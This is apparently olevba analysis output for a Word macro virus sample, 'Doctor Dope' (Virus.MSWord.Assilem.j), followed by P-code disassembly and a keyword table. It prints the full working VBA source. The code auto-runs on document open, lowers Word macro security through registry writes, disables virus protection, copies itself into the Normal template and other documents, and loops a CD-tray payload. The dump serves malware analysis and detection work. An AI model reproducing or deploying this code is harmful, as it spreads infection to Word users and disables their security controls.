olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Assilem.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DrDope.bas 
in file: Virus.MSWord.Assilem.j - OLE stream: 'Macros/VBA/DrDope'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Sub Document_Open()
On Error Resume Next
'VirusName: Doctor Dope
'coded by Necronomikon[rRlf]
'Info: Written for a friend of mine!We all call him Doctor Dope(Steve)!?;)
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
CommandBars("Macro").Controls("Security...").Enabled = False
'--- cut here ---
'this code is taken from XP.Kallisti by jackie/lz0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
'--- cut here ---
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
NT1 = NT.CodeModule.CountOfLines
AD1 = AD.CodeModule.CountOfLines
Nec = 2
If AD.Name <> "ddope" Then
If AD1 > 0 Then _
AD.CodeModule.DeleteLines 1, AD1
Set ToInfect = AD
AD.Name = "ddope"
DoAD = True
End If
If NT.Name <> "ddope" Then
If NT1 > 0 Then _
NT.CodeModule.DeleteLines 1, NT1
Set ToInfect = NT
NT.Name = "ddope"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo bye
If DoNT = True Then
Do While AD.CodeModule.Lines(1, 1) = ""
AD.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While AD.CodeModule.Lines(Nec, 1) <> ""
ToInfect.CodeModule.InsertLines Nec, AD.CodeModule.Lines(Nec, 1)
Nec = Nec + 1
Loop
End If
End If
If DoAD = True Then
Do While NT.CodeModule.Lines(1, 1) = ""
NT.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NT.CodeModule.Lines(Nec, 1) <> ""
ToInfect.CodeModule.InsertLines Nec, NT.CodeModule.Lines(Nec, 1)
Nec = Nec + 1
Loop
End If
bye:
If NT1 <> 0 And AD1 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
Call Payload
End Sub
Private Sub Payload()
On Error Resume Next
'Thanks WalruS for code!;)
Do
mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
Loop
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Assilem.j
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/DrDope - 5427 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Declare Function mciSendString Lib "winmm.dll" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long)
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	QuoteRem 0x0000 0x0016 "VirusName: Doctor Dope"
' Line #5:
' 	QuoteRem 0x0000 0x001B "coded by Necronomikon[rRlf]"
' Line #6:
' 	QuoteRem 0x0000 0x0049 "Info: Written for a friend of mine!We all call him Doctor Dope(Steve)!?;)"
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #8:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #9:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	QuoteRem 0x0000 0x0010 "--- cut here ---"
' Line #11:
' 	QuoteRem 0x0000 0x0031 "this code is taken from XP.Kallisti by jackie/lz0"
' Line #12:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #13:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI4 0x0001 0x0000 
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security"
' 	LitStr 0x000A "AccessVBOM"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #15:
' 	QuoteRem 0x0000 0x0010 "--- cut here ---"
' Line #16:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #17:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #18:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #19:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #20:
' 	EndWith 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set AD 
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NT 
' Line #23:
' 	Ld NT 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NT1 
' Line #24:
' 	Ld AD 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St AD1 
' Line #25:
' 	LitDI2 0x0002 
' 	St Nec 
' Line #26:
' 	Ld AD 
' 	MemLd New 
' 	LitStr 0x0005 "ddope"
' 	Ne 
' 	IfBlock 
' Line #27:
' 	LineCont 0x0004 05 00 00 00
' 	Ld AD1 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld AD1 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #28:
' 	SetStmt 
' 	Ld AD 
' 	Set ToInfect 
' Line #29:
' 	LitStr 0x0005 "ddope"
' 	Ld AD 
' 	MemSt New 
' Line #30:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld NT 
' 	MemLd New 
' 	LitStr 0x0005 "ddope"
' 	Ne 
' 	IfBlock 
' Line #33:
' 	LineCont 0x0004 05 00 00 00
' 	Ld NT1 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NT1 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #34:
' 	SetStmt 
' 	Ld NT 
' 	Set ToInfect 
' Line #35:
' 	LitStr 0x0005 "ddope"
' 	Ld NT 
' 	MemSt New 
' Line #36:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo bye 
' 	EndIf 
' Line #39:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #42:
' 	Loop 
' Line #43:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #44:
' 	Ld Nec 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #45:
' 	Ld Nec 
' 	Ld Nec 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #46:
' 	Ld Nec 
' 	LitDI2 0x0001 
' 	Add 
' 	St Nec 
' Line #47:
' 	Loop 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #53:
' 	Loop 
' Line #54:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #55:
' 	Ld Nec 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #56:
' 	Ld Nec 
' 	Ld Nec 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #57:
' 	Ld Nec 
' 	LitDI2 0x0001 
' 	Add 
' 	St Nec 
' Line #58:
' 	Loop 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Label bye 
' Line #61:
' 	Ld NT1 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld AD1 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #62:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #64:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #65:
' 	ArgsCall (Call) Payload 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Private Sub Payload())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	QuoteRem 0x0000 0x0019 "Thanks WalruS for code!;)"
' Line #70:
' 	Do 
' Line #71:
' 	LitStr 0x0010 "set cd door open"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsCall mciSendString 0x0004 
' 	BoS 0x0000 
' 	LitStr 0x0012 "set cd door closed"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsCall mciSendString 0x0004 
' 	BoS 0x0000 
' 	LitStr 0x001C "set cd time format tmsf wait"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsCall mciSendString 0x0004 
' 	BoS 0x0000 
' 	LitStr 0x0024 "open cdaudio alias cd wait shareable"
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsCall mciSendString 0x0004 
' Line #72:
' 	Loop 
' Line #73:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

